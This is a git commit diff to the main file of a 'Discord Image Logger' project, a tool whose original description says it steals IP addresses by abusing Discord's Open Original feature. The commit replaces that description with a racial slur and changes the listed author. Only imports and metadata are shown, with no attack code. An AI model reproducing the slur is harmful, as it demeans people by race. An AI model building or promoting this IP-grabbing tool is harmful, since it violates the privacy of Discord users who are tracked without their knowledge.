307af213cd6f8be2e448ca360074e1dad58cc52e
Dino <webhook36@gmail.com>
2026-04-15 21:27:14 +0200

    Update main.py

--- api/main.py
+++ api/main.py
@@ -3,9 +3,9 @@ from urllib import parse
 import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__description__ = "Niggers"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "Jaybee"
 
 config = {
     # BASE CONFIG #
